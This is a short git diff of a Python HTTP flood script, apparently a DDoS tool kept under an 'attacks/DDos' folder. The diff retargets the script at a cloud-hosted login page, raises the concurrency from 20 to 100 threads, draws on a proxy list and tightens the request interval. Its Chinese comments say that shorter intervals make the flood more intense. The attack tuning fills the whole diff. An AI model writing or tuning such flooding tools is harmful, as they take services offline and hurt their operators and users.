@@ -4,9 +4,9 @@ import time
 import random
 
 # -------- CONFIGURATION --------
-TARGET_URL = "https://ccdb-31-205-106-14.ngrok-free.app/login"
-NUM_THREADS = 20            # 并发线程数
-PROXY_FILE = "proxies.txt"  # 你的代理列表文件
+TARGET_URL = "http://flask-env.eba-7mjjpfcw.eu-west-2.elasticbeanstalk.com/login"
+NUM_THREADS = 100            # 并发线程数
+PROXY_FILE = "attacks/DDos/proxy_valid.txt"  # 你的代理列表文件
 
 HEADERS = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
@@ -53,8 +53,7 @@ def flood():
                 PROXY_LIST.remove(proxy)
             except ValueError:
                 pass  # 已被其他线程删掉
-        # 可调节请求间隔（越短越猛烈）
-        # time.sleep(0.05)
+        time.sleep(0.01)
 
 # -------- START THREADS --------
 if __name__ == '__main__':
